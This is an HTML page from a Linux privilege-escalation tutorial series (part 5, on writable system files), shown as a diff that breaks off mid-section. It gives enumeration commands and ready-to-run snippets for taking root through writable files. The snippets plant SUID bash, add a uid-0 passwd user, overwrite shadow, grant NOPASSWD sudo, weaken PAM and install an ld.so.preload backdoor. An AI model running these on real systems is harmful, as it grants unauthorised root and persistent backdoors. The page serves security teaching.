@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#050505">
+  <meta name="description" content="Privilege Escalation part 5 of 10. Audit writable configuration, scripts and authentication files that root trusts.">
+  <title>Part 05: Writable System Files | 0XMAP Privilege Escalation</title>
+  <link rel="icon" href="../static/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../static/guide.css">
+</head>
+<body data-root="../">
+  <a class="g-skip" href="#main">Skip to content</a>
+  
+<header class="g-top">
+  <div class="g-top-inner">
+    <a class="g-brand" href="../index.html" aria-label="0XMAP Linux field guide home">
+      <span class="g-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7l4 5-4 5"/><path d="M12 17h8"/></svg></span>
+      <span class="g-brand-text">
+        <span class="g-name">0XMAP</span>
+        <span class="g-sub">Linux field guide</span>
+      </span>
+    </a>
+    <div class="g-top-actions">
+      <nav class="g-top-nav" aria-label="Guide">
+        <a href="../index.html#about">Guide</a>
+        <a href="../index.html#foundations">Foundations</a>
+        <a href="../index.html#privesc">Privilege escalation</a>
+        <a href="../index.html#chapters">Chapters</a>
+      </nav>
+      <button type="button" class="g-search-btn" data-search-open aria-label="Search the guide">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+        <span>Search</span>
+        <kbd>/</kbd>
+      </button>
+      <span class="g-context-pill">Privilege escalation</span>
+      <button type="button" class="g-menu-btn" data-menu-toggle aria-label="Open chapter menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+  
+<div class="g-doc-layout">
+  
+<aside class="g-sidebar" data-sidebar aria-label="Privilege escalation navigation">
+  <div class="g-sidebar-head">
+    <div>
+      <p class="g-sidebar-kicker">Privilege Escalation</p>
+      <p class="g-sidebar-count">10 parts / practitioner path</p>
+    </div>
+    <button type="button" class="g-side-close" data-menu-close aria-label="Close handbook menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+    </button>
+  </div>
+  <nav class="g-side-nav">
+    <section class="g-nav-part">
+      <div class="g-nav-part-head"><span class="g-nav-part-num">PE</span><span>Handbook</span></div>
+      <ol><li><a class="g-nav-link g-nav-link-simple" href="../privesc/01-sudo-misconfigurations.html"><span class="g-nav-num">01</span><span class="g-nav-title">Sudo</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/02-suid-sgid-binaries.html"><span class="g-nav-num">02</span><span class="g-nav-title">SUID and SGID</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/03-linux-capabilities.html"><span class="g-nav-num">03</span><span class="g-nav-title">Capabilities</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/04-cron-jobs.html"><span class="g-nav-num">04</span><span class="g-nav-title">Cron jobs</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/05-writable-system-files.html" aria-current="page"><span class="g-nav-num">05</span><span class="g-nav-title">Writable files</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/06-path-hijacking.html"><span class="g-nav-num">06</span><span class="g-nav-title">PATH hijacking</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/07-environment-variable-abuse.html"><span class="g-nav-num">07</span><span class="g-nav-title">Environment</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/08-kernel-exploits.html"><span class="g-nav-num">08</span><span class="g-nav-title">Kernel</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/09-service-misconfigurations.html"><span class="g-nav-num">09</span><span class="g-nav-title">Services</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/10-nfs-misconfigurations.html"><span class="g-nav-num">10</span><span class="g-nav-title">NFS</span></a></li></ol>
+    </section>
+  </nav>
+  <a class="g-side-guide" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+    <span class="g-side-guide-kicker">Apply it</span>
+    <strong>Chapter 26 / automation</strong>
+    <span>Turn the checks into a repeatable enumeration pass</span>
+  </a>
+  <a class="g-side-guide" href="../index.html#foundations">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Linux Foundations</strong>
+    <span>10 parts from first command to secure baseline</span>
+  </a>
+  <p class="g-sidebar-note">Use these techniques only in labs, CTFs or systems you own and have written permission to test.</p>
+</aside>
+<div class="g-scrim" data-menu-close hidden></div>
+  <main class="g-content" id="main">
+    <article class="g-article">
+      <header class="g-chapter-head">
+        <nav class="g-chapter-crumb" aria-label="Breadcrumb">
+          <a href="../index.html">Field guide</a><span>/</span>
+          <a href="../index.html#privesc">Privilege Escalation</a><span>/</span>
+          <span>Part 05</span>
+        </nav>
+        <p class="g-kicker">Privilege Escalation / Part 05</p>
+        <h1>Writable System Files</h1>
+        <p class="g-deck">Audit writable configuration, scripts and authentication files that root trusts.</p>
+        <div class="g-chapter-meta">
+          <span>17 min read</span>
+          <span>13 sections</span>
+          <span>38 code blocks</span>
+          <span>Part 05 / 10</span>
+        </div>
+      </header>
+      
+<details class="g-toc-mobile">
+  <summary>On this page <span>13 sections</span></summary>
+  <nav aria-label="On this page"><a class="g-toc-link depth-2" href="#writable-system-files-for-privilege-escalation" data-toc-link>Writable System Files for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-the-attack-surface" data-toc-link>1. Understanding the Attack Surface</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-writable-system-files" data-toc-link>2. Enumeration: Finding Writable System Files</a><a class="g-toc-link depth-3" href="#3-writable-scripts-sh-py-pl-rb" data-toc-link>3. Writable Scripts (.sh, .py, .pl, .rb)</a><a class="g-toc-link depth-3" href="#4-writable-configuration-files" data-toc-link>4. Writable Configuration Files</a><a class="g-toc-link depth-3" href="#5-writable-profile-and-environment-files" data-toc-link>5. Writable Profile and Environment Files</a><a class="g-toc-link depth-3" href="#6-writable-directories-with-dynamic-loading" data-toc-link>6. Writable Directories with Dynamic Loading</a><a class="g-toc-link depth-3" href="#7-writable-log-files-command-injection" data-toc-link>7. Writable Log Files (Command Injection)</a><a class="g-toc-link depth-3" href="#8-suid-binary-with-writable-library-dependencies" data-toc-link>8. SUID Binary with Writable Library Dependencies</a><a class="g-toc-link depth-3" href="#9-writable-kernel-modules" data-toc-link>9. Writable Kernel Modules</a><a class="g-toc-link depth-3" href="#10-writable-devices-and-special-files" data-toc-link>10. Writable Devices and Special Files</a><a class="g-toc-link depth-3" href="#11-practical-exploitation-workflow" data-toc-link>11. Practical Exploitation Workflow</a><a class="g-toc-link depth-3" href="#12-defensive-measures" data-toc-link>12. Defensive Measures</a></nav>
+</details>
+      <div class="g-prose"><h2 id="writable-system-files-for-privilege-escalation">Writable System Files for Privilege Escalation<a aria-label="Link to this section" class="g-anchor" href="#writable-system-files-for-privilege-escalation">#</a></h2>
+<p>System files that are <strong>writable by non-root users</strong> represent a critical privilege escalation vector. When root executes scripts or reads configuration files that lower-privileged users can modify, attackers can inject malicious code, alter system behavior, or gain root access. This is often overlooked during system hardening.</p>
+<hr/>
+<h3 id="1-understanding-the-attack-surface">1. Understanding the Attack Surface<a aria-label="Link to this section" class="g-anchor" href="#1-understanding-the-attack-surface">#</a></h3>
+<p><strong>Core Concept</strong>: Any system file that root uses and a non-root user can modify is a potential escalation path. The exploitation typically involves:</p>
+<ol>
+<li><strong>Scripts</strong>: Inject malicious code that root executes</li>
+<li><strong>Configuration files</strong>: Alter settings to execute arbitrary commands</li>
+<li><strong>Log files</strong>: Manipulate to trigger command execution</li>
+<li><strong>Library files</strong>: Hijack function calls</li>
+<li><strong>Binary files</strong>: Replace or modify executables</li>
+</ol>
+<p><strong>Why This Works</strong>: Root trusts system files by default. If a file is writable, root will execute/modify it without checking permissions, executing attacker-controlled code.</p>
+<hr/>
+<h3 id="2-enumeration-finding-writable-system-files">2. Enumeration: Finding Writable System Files<a aria-label="Link to this section" class="g-anchor" href="#2-enumeration-finding-writable-system-files">#</a></h3>
+<p><strong>Comprehensive Search</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-perm<span class="w"> </span>-0002<span class="w"> </span>-path<span class="w"> </span>/proc<span class="w"> </span>-prune<span class="w"> </span>-o<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Find files writable by current user</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span>!<span class="w"> </span>-user<span class="w"> </span>root<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Focus on critical system directories</span>
+find<span class="w"> </span>/bin<span class="w"> </span>/sbin<span class="w"> </span>/usr/bin<span class="w"> </span>/usr/sbin<span class="w"> </span>/etc<span class="w"> </span>/lib<span class="w"> </span>/usr/lib<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Find world-writable scripts</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.sh"</span><span class="w"> </span>-perm<span class="w"> </span>-0002<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.py"</span><span class="w"> </span>-perm<span class="w"> </span>-0002<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Find writable files in cron directories</span>
+find<span class="w"> </span>/etc/cron*<span class="w"> </span>/var/spool/cron<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Check for writable configuration files</span>
+find<span class="w"> </span>/etc<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span>!<span class="w"> </span>-user<span class="w"> </span>root<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"/etc/passwd\|/etc/shadow"</span>
+</code></pre></div>
+<p><strong>Automated Tools</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># LinPEAS will highlight writable files</span>
+./linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"Writable|Writeable"</span><span class="w"> </span>-A<span class="w"> </span><span class="m">5</span>
+
+<span class="c1"># Manual check with colorized output</span>
+find<span class="w"> </span>/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>file<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span>-e<span class="w"> </span><span class="s2">"\033[31m[WRITABLE]\033[0m </span><span class="nv">$file</span><span class="s2">"</span>
+<span class="k">done</span>
+</code></pre></div>
+<hr/>
+<h3 id="3-writable-scripts-sh-py-pl-rb">3. Writable Scripts (.sh, .py, .pl, .rb)<a aria-label="Link to this section" class="g-anchor" href="#3-writable-scripts-sh-py-pl-rb">#</a></h3>
+<h4 id="a-system-scripts-in-path">A. System Scripts in PATH<a aria-label="Link to this section" class="g-anchor" href="#a-system-scripts-in-path">#</a></h4>
+<p>If a script in <code>/bin</code>, <code>/usr/bin</code>, or <code>/usr/local/bin</code> is writable, root might execute it.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Find writable scripts in PATH</span>
+<span class="k">for</span><span class="w"> </span>dir<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="s1">' '</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span>find<span class="w"> </span><span class="nv">$dir</span><span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span>-exec<span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+<span class="k">done</span>
+
+<span class="c1"># Example: /usr/local/bin/backup.sh is world-writable</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash</span>
+<span class="s1">cp /bin/bash /tmp/shell</span>
+<span class="s1">chmod +s /tmp/shell'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/usr/local/bin/backup.sh
+
+<span class="c1"># Wait for root to execute it, then:</span>
+/tmp/shell<span class="w"> </span>-p<span class="w">  </span><span class="c1"># Root shell</span>
+</code></pre></div>
+<p><strong>Note</strong>: Even if the script isn't directly run by root, it might be:</p>
+<ul>
+<li>Called from a cron job</li>
+<li>Included (<code>source</code>) in another script</li>
+<li>Used during system startup</li>
+<li>Called by other system services</li>
+</ul>
+<hr/>
+<h4 id="b-writable-init-scripts">B. Writable Init Scripts<a aria-label="Link to this section" class="g-anchor" href="#b-writable-init-scripts">#</a></h4>
+<p>System initialization scripts in <code>/etc/init.d/</code>, <code>/etc/rc.d/</code>, or systemd unit files.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check writable init scripts</span>
+find<span class="w"> </span>/etc/init.d/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Modify service script</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/sh</span>
+<span class="s1">chmod +s /bin/bash'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/init.d/malicious_service
+
+<span class="c1"># Trigger service restart or wait for reboot</span>
+systemctl<span class="w"> </span>restart<span class="w"> </span>malicious_service
+<span class="c1"># Or wait for system startup</span>
+</code></pre></div>
+<p><strong>Systemd Services</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Find writable service files</span>
+find<span class="w"> </span>/etc/systemd/system/<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.service"</span><span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/lib/systemd/system/<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.service"</span><span class="w"> </span>-writable<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># Modify service</span>
+vim<span class="w"> </span>/etc/systemd/system/some.service
+<span class="c1"># Add: ExecStartPre=/bin/bash -c 'chmod +s /bin/bash'</span>
+
+<span class="c1"># Reload and restart</span>
+systemctl<span class="w"> </span>daemon-reload
+systemctl<span class="w"> </span>restart<span class="w"> </span>some.service
+</code></pre></div>
+<hr/>
+<h3 id="4-writable-configuration-files">4. Writable Configuration Files<a aria-label="Link to this section" class="g-anchor" href="#4-writable-configuration-files">#</a></h3>
+<h4 id="a-etc-sudoers-most-critical">A. /etc/sudoers (Most Critical)<a aria-label="Link to this section" class="g-anchor" href="#a-etc-sudoers-most-critical">#</a></h4>
+<p>If <code>/etc/sudoers</code> is writable, escalate immediately.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check permissions</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/etc/sudoers
+<span class="c1"># Output: -rw-rw-r-- 1 root root (writable by group)</span>
+
+<span class="c1"># Add yourself to sudoers (needs proper syntax)</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'user ALL=(ALL) NOPASSWD: ALL'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/sudoers
+<span class="c1"># Or use visudo to validate</span>
+sudo<span class="w"> </span>bash<span class="w">  </span><span class="c1"># Direct root</span>
+</code></pre></div>
+<p><strong>Note</strong>: Modern systems have <code>/etc/sudoers.d/</code> which might be more permissive:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check directory permissions</span>
+ls<span class="w"> </span>-ld<span class="w"> </span>/etc/sudoers.d/
+<span class="c1"># If writable:</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'user ALL=(ALL) NOPASSWD: ALL'</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/sudoers.d/user
+</code></pre></div>
+<hr/>
+<h4 id="b-etc-passwd-and-etc-shadow">B. /etc/passwd and /etc/shadow<a aria-label="Link to this section" class="g-anchor" href="#b-etc-passwd-and-etc-shadow">#</a></h4>
+<p>If writable, add a new root user or change root password.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Generate password hash</span>
+openssl<span class="w"> </span>passwd<span class="w"> </span>-1<span class="w"> </span>-salt<span class="w"> </span>abc<span class="w"> </span>password123
+<span class="c1"># Output: $1$abc$0J/2wzDqgVX6j.GL5hH3X.</span>
+
+<span class="c1"># Add new root user</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'hacker:$1$abc$0J/2wzDqgVX6j.GL5hH3X.:0:0:Hacker:/root:/bin/bash'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/passwd
+
+<span class="c1"># Now: su hacker (password: password123)</span>
+</code></pre></div>
+<p><strong>/etc/shadow</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If writable, change root password hash</span>
+<span class="c1"># Backup original</span>
+cp<span class="w"> </span>/etc/shadow<span class="w"> </span>/tmp/shadow.bak
+<span class="c1"># Replace root's hash with your own</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'root:$1$abc$0J/2wzDqgVX6j.GL5hH3X.:19000:0:99999:7:::'</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/shadow
+<span class="c1"># Now: su root (password: password123)</span>
+</code></pre></div>
+<hr/>
+<h4 id="c-pam-configuration-etc-pam-d">C. PAM Configuration (/etc/pam.d/)<a aria-label="Link to this section" class="g-anchor" href="#c-pam-configuration-etc-pam-d">#</a></h4>
+<p>PAM modules control authentication. A writable PAM config can bypass authentication.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check permissions</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/etc/pam.d/common-auth
+
+<span class="c1"># Modify to always succeed</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'auth sufficient pam_permit.so'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/pam.d/common-auth
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'auth required pam_unix.so'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/pam.d/common-auth
+
+<span class="c1"># Now any login works</span>
+</code></pre></div>
+<hr/>
+<h4 id="d-ssh-configuration-etc-ssh-sshd-config">D. SSH Configuration (/etc/ssh/sshd_config)<a aria-label="Link to this section" class="g-anchor" href="#d-ssh-configuration-etc-ssh-sshd-config">#</a></h4>
+<p>Enable root login, password authentication, or run custom commands.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Enable root login</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'PermitRootLogin yes'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/ssh/sshd_config
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'PasswordAuthentication yes'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/ssh/sshd_config
+
+<span class="c1"># Force command on login</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'ForceCommand /bin/bash -c "chmod +s /bin/bash &amp;&amp; /bin/bash"'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/ssh/sshd_config
+
+<span class="c1"># Restart SSH</span>
+systemctl<span class="w"> </span>restart<span class="w"> </span>ssh
+</code></pre></div>
+<hr/>
+<h4 id="e-etc-ld-so-conf-and-etc-ld-so-conf-d">E. /etc/ld.so.conf and /etc/ld.so.conf.d/<a aria-label="Link to this section" class="g-anchor" href="#e-etc-ld-so-conf-and-etc-ld-so-conf-d">#</a></h4>
+<p>Controls library search paths. Adding a directory can hijack shared libraries.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Add malicious library directory</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'/tmp/malicious_libs'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/ld.so.conf
+ldconfig
+
+<span class="c1"># Create malicious libc</span>
+gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>-o<span class="w"> </span>/tmp/malicious_libs/libc.so.6<span class="w"> </span>malicious.c
+<span class="c1"># Any program using libc will load our malicious library</span>
+</code></pre></div>
+<p><strong>Risk Level</strong>: Extremely high - affects almost all system processes.</p>
+<hr/>
+<h3 id="5-writable-profile-and-environment-files">5. Writable Profile and Environment Files<a aria-label="Link to this section" class="g-anchor" href="#5-writable-profile-and-environment-files">#</a></h3>
+<h4 id="a-etc-profile-etc-bash-bashrc-etc-profile-d">A. /etc/profile, /etc/bash.bashrc, /etc/profile.d/<a aria-label="Link to this section" class="g-anchor" href="#a-etc-profile-etc-bash-bashrc-etc-profile-d">#</a></h4>
+<p>Global shell initialization scripts executed for every login (including root).</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check permissions</span>
+ls<span class="w"> </span>-la<span class="w"> </span>/etc/profile
+<span class="c1"># If writable:</span>
+
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash</span>
+<span class="s1">rm -f /tmp/backdoor</span>
+<span class="s1">cp /bin/bash /tmp/backdoor</span>
+<span class="s1">chmod +s /tmp/backdoor'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/profile
+
+<span class="c1"># Wait for root login, or trigger:</span>
+su<span class="w"> </span>-<span class="w"> </span>root
+<span class="c1"># /tmp/backdoor -p gives root shell</span>
+</code></pre></div>
+<p><strong>Bashrc Example</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="nb">echo</span><span class="w"> </span><span class="s1">'alias sudo="chmod +s /bin/bash"'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/bash.bashrc
+<span class="c1"># When root types sudo, it executes instead</span>
+</code></pre></div>
+<hr/>
+<h4 id="b-user-specific-profile-files">B. User-specific Profile Files<a aria-label="Link to this section" class="g-anchor" href="#b-user-specific-profile-files">#</a></h4>
+<p>If you can write to root's home directory.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If root's .bashrc is writable</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'chmod +s /bin/bash'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/root/.bashrc
+
+<span class="c1"># Wait for root login or su - root</span>
+</code></pre></div>
+<p><strong>Note</strong>: Root's home is usually <code>/root</code> with strict permissions (750/700). But misconfigurations happen.</p>
+<hr/>
+<h3 id="6-writable-directories-with-dynamic-loading">6. Writable Directories with Dynamic Loading<a aria-label="Link to this section" class="g-anchor" href="#6-writable-directories-with-dynamic-loading">#</a></h3>
+<h4 id="a-etc-ld-so-preload">A. /etc/ld.so.preload<a aria-label="Link to this section" class="g-anchor" href="#a-etc-ld-so-preload">#</a></h4>
+<p>Preloads libraries <strong>before</strong> any program starts. One of the most dangerous writable files.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Create malicious library</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/backdoor.c<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">#include &lt;stdio.h&gt;</span>
+<span class="s">#include &lt;unistd.h&gt;</span>
+<span class="s">#include &lt;sys/types.h&gt;</span>
+<span class="s">__attribute__((constructor)) void init() {</span>
+<span class="s">    setuid(0);</span>
+<span class="s">    system("/bin/bash");</span>
+<span class="s">}</span>
+<span class="s">EOF</span>
+gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>/tmp/backdoor.c<span class="w"> </span>-o<span class="w"> </span>/tmp/backdoor.so
+
+<span class="c1"># Add to ld.so.preload</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'/tmp/backdoor.so'</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/ld.so.preload
+
+<span class="c1"># Next SUID program executed gives root shell</span>
+sudo<span class="w"> </span>ls<span class="w">  </span><span class="c1"># Or any SUID binary</span>
+</code></pre></div>
+<p><strong>Persistent Backdoor</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Add to /etc/ld.so.preload for permanent backdoor</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'/tmp/backdoor.so'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/ld.so.preload
+</code></pre></div>
+<hr/>
+<h4 id="b-python-perl-ruby-site-packages">B. Python/Perl/Ruby Site Packages<a aria-label="Link to this section" class="g-anchor" href="#b-python-perl-ruby-site-packages">#</a></h4>
+<p>If system site-packages directories are writable.</p>
+<p><strong>Exploitation - Python</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Find writable site-packages</span>
